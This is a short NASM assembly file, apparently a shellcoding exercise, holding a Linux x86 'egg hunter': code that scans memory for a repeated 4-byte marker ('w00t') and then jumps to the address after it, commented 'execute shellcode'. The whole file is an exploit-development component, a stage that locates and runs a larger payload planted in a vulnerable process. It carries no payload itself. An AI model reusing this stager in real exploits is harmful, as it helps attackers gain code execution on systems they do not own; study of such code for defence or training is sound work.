; Filename : egg_hunter.nasm
; Author : Swaroop Yermalkar
; Desc : Linux x86 Egg Hunter

global _start

section .text

_start:
	pop eax
_next:
	inc eax

_isegg:
	
	cmp dword [eax-0x8],0x74303077 ;start egg
	jne _next

	cmp dword [eax-0x4],0x74303077 ;end egg
	jne _next

	jmp eax ;execute shellcode 